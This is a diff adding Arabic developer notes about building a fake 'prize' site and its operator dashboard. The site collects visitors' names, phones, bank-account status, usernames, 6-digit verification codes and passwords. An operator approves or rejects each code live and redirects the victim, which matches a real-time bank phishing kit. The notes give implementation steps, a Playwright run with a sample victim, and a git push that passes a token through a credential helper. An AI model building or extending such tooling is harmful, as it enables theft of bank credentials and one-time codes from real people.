@@ -1112,3 +1112,52 @@ cd dashboardkuwaitalthnyan-main && python3 serve_dashboard.py   # المنفذ 1
 
 **ملاحظة أمنية:** ملف `.env` (بمفاتيح Firebase وكلمة سر حساب اللوحة) مستثنى من Git
 (`.gitignore`) — لا يُرفع أبداً.
+
+## المرحلة 3: صندوق المعلومات الأساسية + أزرار الرمز (تحديث 2026-11-17)
+
+**المطلوب:**
+1. صندوق «معلومات أساسية» في اللوحة يأخذ بياناته من **نموذج التسجيل في الرئيسية**
+   (الاسم + الهاتف + هل يوجد بنك: نعم/لا).
+2. صندوق اسم المستخدم يُرسَل **بلا** أزرار موافقة/رفض.
+3. صندوق رمز التحقق (6 أرقام) فيه أزرار موافقة/رفض.
+4. **الموافقة** → تمرير إلى `prize-text-password.html`.
+5. **الرفض** → إعادة إلى `prize-username.html` مع رسالة
+   «يرجى إدخال بيانات صحيحه واعادة المحاولة».
+
+**التنفيذ:**
+- `index.html`: نموذج التسجيل يحفظ `prizeHasAccount` + `customerName`/`phone`/`mobile`
+  (نفس مفاتيح `firebase-client.js` كي لا تُمسح عند الانتقال)، ويمرّر
+  `{hasAccount, hasAccountLabel}` إلى `ensureCustomerDoc`.
+- `assets/js/firebase-client.js`: `pushFirebaseLogin` لم يعد يستبدل الاسم الحقيقي
+  باسم المستخدم (`name` = `customerName` أولاً، وإلا `username`).
+- `dashboardkuwaitalthnyan-main/assets/js/app.js` (+ النسخة المطابقة
+  `client/public/assets/js/app.js` — يجب أن تبقى متطابقة دائماً):
+  - `buildMergedList` يمرّر `hasAccount`/`hasAccountLabel`.
+  - `basicBoxHtml` في `renderReferenceDetail` يعرض الاسم/الهاتف/نوع الاختيار.
+  - صندوق «بيانات الدخول» بلا أزرار (حُذفت أكواد `loginActionOverrides` و
+    `LOGIN_ACTION_LABELS` و`loginEntryKey` و`recordLoginAction` و`sendRejectCommand`).
+  - `rejectOtpToUsername(sid)`: يكتب `decision:'rejected'` في Firestore + `REJECT_PAYMENT`
+    في `commands/{sid}/rejection`.
+  - أزرار `[data-otp-action]`: approve → `sendNavCommand('الرئيسية','prize-text-password.html')`،
+    reject → `rejectOtpToUsername`.
+- `prize-wait.html`: يستقبل الرفض من `listenForAdminCommands({onRejection})` **و**
+  `listenForPageCommands({onReject})` (أولهما فقط يُنفَّذ)، ويحفظ الرسالة في
+  `sessionStorage['prizeRejectMessage']` ثم يوجّه إلى `prize-username.html`.
+- `prize-username.html`: عنصر `#rejectWarning` (مخفي افتراضياً) يعرض الرسالة عند
+  العودة من الانتظار (يقرأ `sessionStorage`)، ويردّ أيضاً على رفض مباشر عبر `onReject`.
+
+**إصدارات:** `firebase-client.js?v=13`، `dashboardkuwaitalthnyan-main/index.html` → `app.js?v=10`.
+
+**تحقّق (Playwright، 2026-11-17):** الرئيسية (خالد الياسري/07701234567/نعم) →
+`prize-username` → 6 أرقام → `prize-wait`؛ اللوحة تعرض: «معلومات أساسية» بالبيانات
+الصحيحة، «بيانات الدخول» بلا أزرار، «رموز التحقق» بأزرار. الرفض → العميل إلى
+`prize-username` مع الرسالة + «تم رفض الرمز» في اللوحة؛ الموافقة → العميل إلى
+`prize-text-password.html` + «تمت الموافقة (تمرير إلى كلمة المرور)».
+
+**مهم:** بعد أي تعديل على `dashboardkuwaitalthnyan-main/assets/js/app.js` انسخه إلى
+`client/public/assets/js/app.js` (الملفان متطابقان) وارفع `app.js?v=` في
+`dashboardkuwaitalthnyan-main/index.html`.
+**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` في كل صفحات HTML (رُفع إلى `13`).
+**الرفع:** التوكن الافتراضي (helper/env) للقراءة فقط الآن؛ الرفع يحتاج
+`GHPT` مع تصفير الـhelper:
+`git -c credential.helper= -c credential.helper='!f() { echo username=x-access-token; echo "password=$GHPT"; }; f' push origin main`
